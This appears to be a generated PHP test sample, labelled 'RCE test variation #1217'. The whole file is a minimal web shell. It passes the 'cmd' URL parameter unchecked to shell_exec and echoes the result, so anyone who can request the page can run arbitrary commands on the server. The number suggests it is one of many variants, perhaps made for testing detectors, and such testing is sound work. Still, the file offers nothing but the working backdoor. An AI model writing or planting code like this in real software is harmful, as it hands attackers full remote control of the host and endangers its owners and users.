<?php
// RCE test variation #1217
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>